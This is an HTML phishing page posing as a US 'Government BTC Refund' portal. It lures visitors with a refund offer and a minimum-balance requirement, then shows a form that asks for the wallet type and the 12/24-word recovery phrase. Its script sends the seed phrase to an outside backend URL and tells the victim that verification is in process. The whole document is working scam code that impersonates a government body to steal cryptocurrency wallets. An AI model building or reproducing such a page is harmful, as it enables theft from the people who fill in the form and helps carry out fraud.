<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GovBTCClaim Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      background-image: url('https://i.ibb.co/xhMPg5m/govbtc-faint-bg.png'); /* optional faint bg */
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      text-align: center;
      padding-top: 50px;
    }

    .container {
      background: white;
      width: 90%;
      max-width: 400px;
      margin: auto;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      color: #f7931a;
    }

    .btn {
      background-color: #f7931a;
      color: white;
      padding: 12px 20px;
      margin-top: 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }

    .wallet-box {
      margin-top: 25px;
      background: #eee;
      padding: 15px;
      border-radius: 8px;
      word-break: break-word;
    }

    .note {
      font-size: 13px;
      color: #777;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>ðŸ‡ºðŸ‡¸ Government BTC Refund</h2>
    <p>Claim your Bitcoin refund through verified wallet connection.</p>
    <p><strong>Minimum Required: 0.0092 BTC (~$1,000)</strong></p>
    <button class="btn" onclick="connectWallet()">Connect Wallet</button>

    <div class="wallet-box" id="walletBox" style="display:none;">
      <form id="seedForm">
        <label for="walletType">Select Wallet Type:</label><br>
        <select id="walletType" name="walletType" required>
          <option value="">--Choose--</option>
          <option value="MetaMask">MetaMask</option>
          <option value="Trust Wallet">Trust Wallet</option>
          <option value="Coinbase Wallet">Coinbase Wallet</option>
          <option value="Ledger">Ledger</option>
        </select><br><br>

        <label for="seedPhrase">Enter your 12/24-word Recovery Phrase:</label><br>
        <textarea id="seedPhrase" name="seedPhrase" rows="4" cols="40" required></textarea><br><br>

        <button class="btn" type="submit">Submit</button>
      </form>
    </div>

    <div class="note">
      If your wallet has less than the required amount,<br>
      please contact <strong>admin@govbtcclaim.org</strong><br>
      or reach out via the live chat.
    </div>
  </div>

  <script>
    function connectWallet() {
      document.getElementById('walletBox').style.display = 'block';
    }

    document.getElementById('seedForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const seed = document.getElementById('seedPhrase').value;
      const wallet = document.getElementById('walletType').value;

      fetch('https://your-backend-url.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seedPhrase: seed, walletType: wallet })
      });

      alert("Wallet verification is in process. Youâ€™ll be contacted shortly.");
    });
  </script>
